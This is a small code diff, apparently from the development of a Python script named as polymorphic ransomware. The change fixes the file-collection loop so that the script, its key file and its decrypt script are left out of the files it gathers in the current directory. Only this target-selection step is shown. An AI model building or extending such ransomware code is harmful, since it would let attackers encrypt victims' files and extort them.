@@ -2,7 +2,7 @@ def run():
     files = []
 
     for file in os.listdir():
-        if file == "ransomware_polymorphic.py" or file == "thekey.key" or file == "ransomware_polymorphic.py":
+        if file == "ransomware_polymorphic.py" or file == "thekey.key" or file == "decrypt_ransomware.py":
             continue
         if os.path.isfile(file):
             files.append(file)
